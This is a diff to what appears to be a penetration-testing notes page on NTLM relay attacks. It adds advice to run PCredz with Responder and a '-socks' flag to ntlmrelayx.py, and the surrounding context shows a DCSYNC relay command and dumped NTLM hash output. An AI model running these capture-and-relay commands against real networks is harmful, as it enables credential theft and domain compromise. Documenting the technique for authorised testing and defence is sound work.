@@ -257,7 +257,7 @@ john_do_adm:19530:aad3b435b51404eeaad3b435b51404ee:2b311d396123456789f280077beee
 For every connection received, this module will try to relay that connection
 to specified target(s) system or (by default) the original client
 
-Start Responder.py and turn off HTTP and SMB server.
+Start Responder.py and turn off HTTP and SMB server. Also start [PCredz]({{< ref "pcredz" >}}) in listening mode (`sudo python3 Pcredz -i eth0`).
 
 ```plain
 $ sudo python3 Responder.py -I enp0s31f6
@@ -279,7 +279,7 @@ $ sudo python3 Responder.py -I enp0s31f6
 Start ntlmrelayx.py with the target system in place.
 
 ```plain
-$ sudo ntlmrelayx.py -t DCSYNC://10.10.10.10 -smb2support
+$ sudo ntlmrelayx.py -t DCSYNC://10.10.10.10 -smb2support -socks
 Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
 [...SNIP...]
 [*] Servers started, waiting for connections
@@ -294,10 +294,10 @@ Administrator:500:aad3b435b51404eeaad3b435b51404ee:97f2592347d8fbe42be381726ff9e
 [...SNIP...]
 ```
 
-By default NTLMrelayx.py relays to the client who sends the hash, dumping SAM.
+By default NTLMrelayx.py relays to the client who sends the hash, dumping SAM. It's recommended to use `-socks` so if authentication was succesful a socks connection is set up. This way you can use tooling thru for example ProxyChains.
 
 ```plain
-$ sudo ntlmrelayx.py -smb2support
+$ sudo ntlmrelayx.py -smb2support -socks
 Impacket v0.9.22.dev1+20200924.183326.65cf657f - Copyright 2020 SecureAuth Corporation
 [...SNIP...]
 [*] Servers started, waiting for connections
